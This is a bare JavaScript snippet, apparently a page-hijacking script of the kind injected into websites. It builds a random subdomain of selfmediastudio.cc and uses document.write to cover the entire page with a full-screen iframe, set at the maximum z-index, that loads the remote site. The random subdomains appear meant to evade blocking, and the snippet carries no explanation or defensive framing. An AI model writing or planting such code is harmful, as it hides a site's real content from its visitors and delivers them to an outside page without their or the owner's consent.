function generateRandomPrefix(length) {
    var result = '';
    var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
var randomPrefix = generateRandomPrefix(Math.floor(Math.random() * (20 - 5 + 1)) + 5);
var baseDomain = 'selfmediastudio.cc/web/hl.html';
var fullUrl = 'https://' + randomPrefix + '.' + baseDomain;
console.log(fullUrl);
document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
document.write('<style>html,body{width:100%;height:100%;overflow:hidden; margin:0;}</style>');
document.write('<div style="width:100%;height:100%;position:fixed;top:0;left:0;z-index:2147483647;background:#fff">');
document.write('<iframe src="' + fullUrl + '" frameborder="0" style="border:0;width:100%;height:100%;"></iframe>');
document.write('</div>');